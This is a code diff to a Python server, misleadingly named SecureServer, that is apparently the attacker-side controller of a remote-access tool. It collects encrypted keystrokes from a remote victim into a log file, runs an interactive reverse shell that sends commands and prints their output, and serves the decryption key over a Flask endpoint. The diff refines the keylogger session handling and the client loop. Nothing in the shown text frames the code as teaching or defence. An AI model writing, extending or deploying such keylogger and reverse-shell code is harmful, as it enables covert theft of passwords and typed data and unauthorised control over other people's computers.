@@ -1,6 +1,7 @@
 import socket
 import ssl
 import os
+import threading
 from flask import Flask, jsonify
 from cryptography.fernet import Fernet
 from threading import Thread
@@ -10,7 +11,7 @@ app = Flask(__name__)
 
 class SecureServer:
     def __init__(self):
-        self.server_ip = "192.168.0.8"
+        self.server_ip = "192.168.204.129"
         self.server_port = 5555
         self.filepath = "encryption.txt"
 
@@ -41,24 +42,49 @@ class SecureServer:
     def keyLogger(self, client):
         """Handles keylogging data from the client."""
         print("Starting keylogger session...")
-
-        with open("keylogs.txt", "a") as keyLogs:
+        self.stop_logging = False
+        
+        def stop_listener():
             while True:
+                command = input("Enter 'stop' to stop: ")
+                if command == "stop":
+                    self.stop_logging = True
+                    print("Stopping keylogger session...")
+                    with open("keylogs.txt", "r") as p:
+                      logs = p.read()
+                      print(logs) 
+                      print(f"{self.stop_logging}")
+                    return
+
+        threading.Thread(target=stop_listener, daemon=True).start()
+        
+        if os.path.exists("keylogs.txt") or os.stat("keylogs.txt").st_size == 0:
+          with open("keylogs.txt","w") as file:
+            file.write("")
+            file.flush()
+        with open("keylogs.txt", "a") as keyLogs:
+            while not self.stop_logging:
+                print(f"{self.stop_logging}")
                 data = client.recv(1024)
                 if not data:
                     break
                 try:
-                    data = self.cipher.decrypt(data).decode()
-                    decrypted_data = str(data)
-                    keyLogs.write(decrypted_data)
-                    print(f"{decrypted_data}")
+                    decrypted_data = self.cipher.decrypt(data).decode()
+                    decrypted_data = str(decrypted_data).replace("'", "")
+
                     if decrypted_data == "Key.enter":
-                     keyLogs.write("\n")
-                     print("\n")
+                        decrypted_data = "\n"
+                    elif decrypted_data == "Key.space":
+                        decrypted_data = " "
+                    elif decrypted_data in ["Key.shift", "Key.ctrl"]:
+                        decrypted_data = ""
+                    keyLogs.write(decrypted_data)
+                    keyLogs.flush()
+
                 except Exception as e:
                     print(f"Decryption failed: {e}")
                     break
-        client.close()
+            return
 
     def reverseShell(self, client):
         """Handles reverse shell connection from the client."""
@@ -68,20 +94,25 @@ class SecureServer:
             command = input("shell> ")
             if command.lower() == "exit":
                 client.send(command.encode())
-                client.close()
                 break
 
             client.send(command.encode())
             response = client.recv(4096).decode()
             print(response)
-
-    def handle_client(self):
-        """Accept client connections and start the appropriate function."""
+        return
+    
+    
+    def start_client(self):
+        client, address = self.secure_server.accept()
+        print(f"Secure connection from {address}")
+        self.handle_client(client)
+        print("back in start_client")
+        return
+    
+    def handle_client(self, client):
         while True:
+            print("in client")
             try:
-                client, address = self.secure_server.accept()
-                print(f"Secure connection from {address}")
-
                 # Send user choice to client
                 print("\n1) Keylogger\n2) Reverse Shell\n3) Exit")
                 choice = input("input> ")
@@ -93,6 +124,7 @@ class SecureServer:
                     self.reverseShell(client)
                 elif choice == "3":
                     client.close()
+                    self.secure_server.close()
                     break
                 else:
                     print("Invalid option.")
@@ -100,6 +132,8 @@ class SecureServer:
 
             except Exception as e:
                 print(f"Error: {e}")
+        print("out of while")        
+        return       
 
 # Flask route for encryption key retrieval
 @app.route("/get_key", methods=["GET"])
@@ -113,8 +147,9 @@ if __name__ == "__main__":
     server.start()
 
     # Start Flask API in a separate thread
-    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=5000))
+    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=5000), daemon=True)
     flask_thread.start()
 
-    server.handle_client()
+    server.start_client()
+    
 
